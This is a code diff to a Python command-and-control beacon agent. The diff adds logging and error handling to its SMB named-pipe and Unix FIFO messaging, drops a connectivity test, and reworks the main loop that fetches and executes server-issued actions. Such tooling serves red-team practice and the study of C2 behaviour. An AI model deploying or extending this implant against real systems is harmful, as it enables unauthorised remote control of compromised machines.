@@ -152,17 +152,25 @@ class PythonBeacon:
                     )
                     
                     # Write message
+                    self.log(f"SMB: Writing message to pipe: {message}")
                     win32file.WriteFile(pipe_handle, message.encode('utf-8'))
                     
                     if expect_response:
                         if is_file_transfer:
                             return pipe_handle  # Return handle for file operations
                         else:
-                            # Read response
-                            result, response_data = win32file.ReadFile(pipe_handle, 4096)
-                            response = response_data.decode('utf-8').strip()
-                            win32file.CloseHandle(pipe_handle)
-                            return response
+                            # Read response with timeout handling
+                            self.log("SMB: Waiting for response...")
+                            try:
+                                result, response_data = win32file.ReadFile(pipe_handle, 4096)
+                                response = response_data.decode('utf-8').strip()
+                                self.log(f"SMB: Received response: {response}")
+                                win32file.CloseHandle(pipe_handle)
+                                return response
+                            except Exception as read_error:
+                                self.log(f"SMB: Read error: {read_error}")
+                                win32file.CloseHandle(pipe_handle)
+                                return f"ERROR: Read failed: {read_error}"
                     else:
                         win32file.CloseHandle(pipe_handle)
                         return "OK"
@@ -180,25 +188,46 @@ class PythonBeacon:
                         else:
                             return "OK"
                     
-            else:  # Unix-like (FIFO)
+            else:  # Unix-like (FIFO) - Back to FIFO with better error handling
                 pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"
                 
                 if not os.path.exists(pipe_path):
                     self.log(f"SMB pipe not found: {pipe_path}")
                     return "ERROR: Pipe not found"
                 
-                # Write to FIFO
-                with open(pipe_path, 'w') as pipe:
-                    pipe.write(message)
-                    pipe.flush()
-                
-                if expect_response:
-                    # Read response from FIFO (simplified)
-                    with open(pipe_path, 'r') as pipe:
-                        response = pipe.read().strip()
-                        return response
-                else:
-                    return "OK"
+                self.log(f"SMB: Using FIFO: {pipe_path}")
+                try:
+                    # Write message to FIFO
+                    with open(pipe_path, 'w') as pipe:
+                        pipe.write(message)
+                        pipe.flush()
+                        self.log(f"SMB: Wrote to FIFO: {message}")
+                    
+                    if expect_response:
+                        self.log("SMB: Waiting for FIFO response...")
+                        
+                        # Give receiver time to process
+                        time.sleep(0.1)
+                        
+                        # Read response from FIFO
+                        try:
+                            with open(pipe_path, 'r') as pipe:
+                                response = pipe.read().strip()
+                                if response:
+                                    self.log(f"SMB: Received FIFO response: {response}")
+                                    return response
+                                else:
+                                    self.log("SMB: Empty FIFO response")
+                                    return "ERROR: Empty response"
+                        except Exception as read_error:
+                            self.log(f"SMB: FIFO read error: {read_error}")
+                            return f"ERROR: FIFO read failed: {read_error}"
+                    else:
+                        return "OK"
+                        
+                except Exception as fifo_error:
+                    self.log(f"SMB: FIFO error: {fifo_error}")
+                    return f"ERROR: FIFO operation failed: {fifo_error}"
                 
         except Exception as e:
             self.log(f"SMB Error: {e}")
@@ -231,7 +260,9 @@ class PythonBeacon:
     def request_action(self):
         """Request pending action from server"""
         message = f"request_action|{self.agent_id}"
+        self.log(f"Requesting action: {message}")
         response = self.send_message(message)
+        self.log(f"Action response: {response}")
         return response
 
     def send_checkin(self):
@@ -429,73 +460,10 @@ class PythonBeacon:
             self.log(f"Error processing command: {e}")
             self.send_command_output(f"ERROR: {e}")
 
-    def test_connectivity(self):
-        """Test basic connectivity to server"""
-        self.log(f"Testing {self.protocol.upper()} connectivity to {self.server_ip}:{self.server_port}")
-        
-        if self.protocol == "udp":
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.settimeout(5)
-                test_message = "test|ping"
-                bytes_sent = sock.sendto(test_message.encode('utf-8'), (self.server_ip, self.server_port))
-                self.log(f"UDP test: Sent {bytes_sent} bytes")
-                
-                try:
-                    response, addr = sock.recvfrom(1024)
-                    self.log(f"UDP test: Received response from {addr}")
-                    sock.close()
-                    return True
-                except socket.timeout:
-                    self.log("UDP test: No response received (this may be normal)")
-                    sock.close()
-                    return True  # UDP might not respond to test messages
-            except Exception as e:
-                self.log(f"UDP test failed: {e}")
-                return False
-                
-        elif self.protocol == "smb":
-            # Test SMB named pipe availability
-            pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"
-            self.log(f"SMB test: Checking for named pipe: {pipe_path}")
-            
-            if os.name == 'nt':
-                try:
-                    import win32pipe
-                    # Check if named pipe exists
-                    result = win32pipe.WaitNamedPipe(pipe_path, 1000)  # 1 second timeout
-                    if result:
-                        self.log("SMB test: Named pipe is available")
-                        return True
-                    else:
-                        self.log("SMB test: Named pipe not available - make sure SMB receiver is running")
-                        return False
-                except ImportError:
-                    self.log("SMB test: pywin32 not available, will try basic file operations")
-                    return True
-                except Exception as e:
-                    self.log(f"SMB test failed: {e}")
-                    return False
-            else:
-                # Unix FIFO test
-                pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"
-                if os.path.exists(pipe_path):
-                    self.log("SMB test: FIFO exists")
-                    return True
-                else:
-                    self.log(f"SMB test: FIFO not found at {pipe_path}")
-                    return False
-        
-        return True  # Skip test for other protocols
 
     def run(self):
         """Main beacon loop"""
         self.log("Starting beacon...")
-        
-        # Test connectivity first
-        if not self.test_connectivity():
-            self.log("Connectivity test failed - check server and port configuration")
-            return
         
         # Initial registration
         self.register()
@@ -504,16 +472,18 @@ class PythonBeacon:
         try:
             while self.is_running:
                 try:
-                    # Request action from server
+                    # Request action from server with timeout handling
+                    self.log("Starting beacon cycle...")
                     action = self.request_action()
                     
                     if action and not action.startswith("ERROR"):
                         self.process_command(action)
-                    
-                    # Send checkin
-                    self.send_checkin()
+                    elif action and action.startswith("ERROR"):
+                        self.log(f"Communication error: {action}")
+                        self.log("Will retry in next cycle...")
                     
                     # Wait before next cycle
+                    self.log(f"Waiting {self.check_in_interval} seconds before next cycle...")
                     time.sleep(self.check_in_interval)
                     
                 except KeyboardInterrupt:
